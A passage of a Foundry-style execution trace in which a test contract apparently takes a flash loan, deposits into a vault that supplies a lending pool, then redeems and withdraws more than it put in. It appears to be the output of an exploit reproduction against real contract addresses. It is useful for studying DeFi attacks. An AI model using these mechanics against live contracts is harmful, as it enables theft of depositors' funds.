    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveDataUpdated(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 6258279247219759135494654 [6.258e24], param2: 52195429828413756897364023 [5.219e25], param3: 17563438627310055178912186 [1.756e25], param4: 1014182544046923627575866516 [1.014e27], param5: 1023095144527329322798772856 [1.023e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12671] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transferFrom(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0x625E7708f30cA75bfd92586e17077590C60eb4cD, 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11997] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transferFrom(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0x625E7708f30cA75bfd92586e17077590C60eb4cD, 194263946041 [1.942e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, to: 0x625E7708f30cA75bfd92586e17077590C60eb4cD, value: 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11154] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::mint(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194263946041 [1.942e11], 1014182544046923627575866516 [1.014e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10587] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::mint(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194263946041 [1.942e11], 1014182544046923627575866516 [1.014e27]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2973] 0x929EC64c34a17401F460460D4B9390518E5B473e::handleAction(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 184815907073213 [1.848e14], 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2319] 0xaad324f7e4Dd50C6b105820f8a877eE2DCBFA789::handleAction(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 184815907073213 [1.848e14], 0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, value: 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Mint(param0: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param2: 194263946041 [1.942e11], param3: 0, param4: 1014182544046923627575866516 [1.014e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveUsedAsCollateralEnabled(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Supply(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param2: 0x0000000000000000000000000000000000000000, param3: 1456264980866434195646133652057223631443830693526 [1.456e48], param4: 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1844317480751 [1.844e12])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Deposit(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 194263946041 [1.942e11], param3: 1844317480751 [1.844e12])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1844317480751 [1.844e12]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9
    в”‚   в”‚   в”‚   в”њв”Ђ [25771] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194283372435 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25097] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194283372435 [1.942e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, value: 194283372435 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [1226] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [529] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 194283372435 [1.942e11]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 194283372435 [1.942e11]
    в”‚   в”‚   в”‚   в”њв”Ђ [53224] 0x794a61358D6845594F94dc1DB02A252b5b4814aD::supply(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194283372435 [1.942e11], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [52660] 0xDF9e4ABdbd94107932265319479643D3B05809dc::supply(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 194283372435 [1.942e11], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [51412] 0xC603A9E957482298738EA65aA24e61b38859B48D::1913f161(000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000000363e93b99deab8fa8b6a363830758cb0270dc6ca5cd557b019a86bf7b25a3dd4e7000000000000000000000000b97ef9ef8734c71904d8002f8b6bc66dd9c48a6e0000000000000000000000000000000000000000000000000000002d3c30ff93000000000000000000000000ff152e21c5a511c478ed23d1b89bb9391be6de960000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [968] 0xFCCf3cAbbe80101232d343252614b6A3eE81C989::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [419] 0x81387c40EB75acB02757C1Ae55D5936E78c9dEd3::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000041da786a480b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000041da786a480b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3176] 0x307ffe186F84a3bc2613D1eA417A5737D69A7007::getSupplyData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2615] 0x52A1CeB68Ee6b7B5D13E0376A1E0E4423A8cE26e::getSupplyData() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000100653c0a7000000000000000000000000000000000000000000000000000000100b095c580000000000000000000000000000000000000000002bbe2e26496e04a670b9dc00000000000000000000000000000000000000000000000000000000639b2002
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000100653c0a7000000000000000000000000000000000000000000000000000000100b095c580000000000000000000000000000000000000000002bbe2e26496e04a670b9dc00000000000000000000000000000000000000000000000000000000639b2002
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [924] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [375] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000a84367998ac7
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000a84367998ac7
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5499] 0xf4a0039F2d4a2EaD5216AbB6Ae4C4C3AA2dB9b82::calculateInterestRates((0, 194283372435 [1.942e11], 0, 68904639576 [6.89e10], 74078819311737 [7.407e13], 52881911184258890734811612 [5.288e25], 1000, 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 0x625E7708f30cA75bfd92586e17077590C60eb4cD)) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1226] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::balanceOf(0x625E7708f30cA75bfd92586e17077590C60eb4cD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [529] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::balanceOf(0x625E7708f30cA75bfd92586e17077590C60eb4cD) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 113483779637734 [1.134e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 113483779637734 [1.134e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000052a817cd97587093038830000000000000000000000000000000000000000002b2c54d07c40744273bc9d0000000000000000000000000000000000000000000e835b10c1d056839de4e9
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveDataUpdated(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 6245357116690132989130883 [6.245e24], param2: 52193158918130835580501149 [5.219e25], param3: 17545271345046684644009193 [1.754e25], param4: 1014182544046923627575866516 [1.014e27], param5: 1023095144527329322798772856 [1.023e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8671] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transferFrom(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0x625E7708f30cA75bfd92586e17077590C60eb4cD, 194283372435 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7997] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transferFrom(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0x625E7708f30cA75bfd92586e17077590C60eb4cD, 194283372435 [1.942e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, to: 0x625E7708f30cA75bfd92586e17077590C60eb4cD, value: 194283372435 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [13954] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::mint(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194283372435 [1.942e11], 1014182544046923627575866516 [1.014e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [13387] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::mint(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 194283372435 [1.942e11], 1014182544046923627575866516 [1.014e27]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2973] 0x929EC64c34a17401F460460D4B9390518E5B473e::handleAction(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 185007454390983 [1.85e14], 191547317770 [1.915e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2319] 0xaad324f7e4Dd50C6b105820f8a877eE2DCBFA789::handleAction(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 185007454390983 [1.85e14], 191547317770 [1.915e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, value: 194283372435 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Mint(param0: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param2: 194283372435 [1.942e11], param3: 0, param4: 1014182544046923627575866516 [1.014e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Supply(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param2: 0x0000000000000000000000000000000000000000, param3: 1456264980866434195646133652057223631443830693526 [1.456e48], param4: 194283372435 [1.942e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”њв”Ђ emit FlashLoan(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param3: 194263946041 [1.942e11])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    в”‚   в”‚   в”њв”Ђ [105766] 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96::redeem(1844317480751 [1.844e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”њв”Ђ [3089] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2537] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::balanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1340] 0x794a61358D6845594F94dc1DB02A252b5b4814aD::getReserveNormalizedIncome(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [788] 0xDF9e4ABdbd94107932265319479643D3B05809dc::getReserveNormalizedIncome(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000346e981e0ac3276197b7494
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000346e981e0ac3276197b7494
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 388547318477 [3.885e11]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 388547318477 [3.885e11]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 1844317480751 [1.844e12])
    в”‚   в”‚   в”‚   в”њв”Ђ [67806] 0x794a61358D6845594F94dc1DB02A252b5b4814aD::withdraw(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 368503794025 [3.685e11], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [67245] 0xDF9e4ABdbd94107932265319479643D3B05809dc::withdraw(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 368503794025 [3.685e11], 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [402] 0xa97684ead0e402dC232d5A977953DF7ECBaB3CDb::getPriceOracle() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0xEBd36016B3eD09D4693Ed4251c67Bd858c3c7C9C
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [64624] 0xC603A9E957482298738EA65aA24e61b38859B48D::186dea44(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003600000000000000000000000000000000000000000000000000000000000000373e93b99deab8fa8b6a363830758cb0270dc6ca5cd557b019a86bf7b25a3dd4e7000000000000000000000000b97ef9ef8734c71904d8002f8b6bc66dd9c48a6e00000000000000000000000000000000000000000000000000000055cc89a969000000000000000000000000ff152e21c5a511c478ed23d1b89bb9391be6de96000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000ebd36016b3ed09d4693ed4251c67bd858c3c7c9c0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [968] 0xFCCf3cAbbe80101232d343252614b6A3eE81C989::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [419] 0x81387c40EB75acB02757C1Ae55D5936E78c9dEd3::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000041da786a480b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000041da786a480b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3176] 0x307ffe186F84a3bc2613D1eA417A5737D69A7007::getSupplyData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2615] 0x52A1CeB68Ee6b7B5D13E0376A1E0E4423A8cE26e::getSupplyData() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000100653c0a7000000000000000000000000000000000000000000000000000000100b095c580000000000000000000000000000000000000000002bbe2e26496e04a670b9dc00000000000000000000000000000000000000000000000000000000639b2002
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000100653c0a7000000000000000000000000000000000000000000000000000000100b095c580000000000000000000000000000000000000000002bbe2e26496e04a670b9dc00000000000000000000000000000000000000000000000000000000639b2002
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1146] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::scaledBalanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [626] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::scaledBalanceOf(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000000000000059335c833f
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000000000000059335c833f
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5499] 0xf4a0039F2d4a2EaD5216AbB6Ae4C4C3AA2dB9b82::calculateInterestRates((0, 0, 368503794025 [3.685e11], 68904639576 [6.89e10], 74078819311737 [7.407e13], 52881911184258890734811612 [5.288e25], 1000, 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, 0x625E7708f30cA75bfd92586e17077590C60eb4cD)) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1226] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::balanceOf(0x625E7708f30cA75bfd92586e17077590C60eb4cD) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [529] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::balanceOf(0x625E7708f30cA75bfd92586e17077590C60eb4cD) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 113678063010169 [1.136e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 113678063010169 [1.136e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000052fb4056245c12e0477a60000000000000000000000000000000000000000002b2d3e87ffc00b649c08480000000000000000000000000000000000000000000e8aa8ccddcd0f94e04246
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveDataUpdated(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 6269901124650500828198822 [6.269e24], param2: 52197470233053227885791304 [5.219e25], param3: 17579761864425823086330438 [1.757e25], param4: 1014182544046923627575866516 [1.014e27], param5: 1023095144527329322798772856 [1.023e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [36225] 0x625E7708f30cA75bfd92586e17077590C60eb4cD::burn(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 368503794025 [3.685e11], 1014182544046923627575866516 [1.014e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [35661] 0xa5ba6E5EC19a1Bf23C857991c857dB62b2Aa187B::burn(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 368503794025 [3.685e11], 1014182544046923627575866516 [1.014e27]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2973] 0x929EC64c34a17401F460460D4B9390518E5B473e::handleAction(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 185199020863484 [1.851e14], 383113790271 [3.831e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2319] 0xaad324f7e4Dd50C6b105820f8a877eE2DCBFA789::handleAction(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 185199020863484 [1.851e14], 383113790271 [3.831e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, to: 0x0000000000000000000000000000000000000000, value: 368503794025 [3.685e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Burn(param0: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param2: 368503794025 [3.685e11], param3: 0, param4: 1014182544046923627575866516 [1.014e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [24628] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transfer(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 368503794025 [3.685e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23928] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transfer(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, 368503794025 [3.685e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x625E7708f30cA75bfd92586e17077590C60eb4cD, to: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, value: 368503794025 [3.685e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
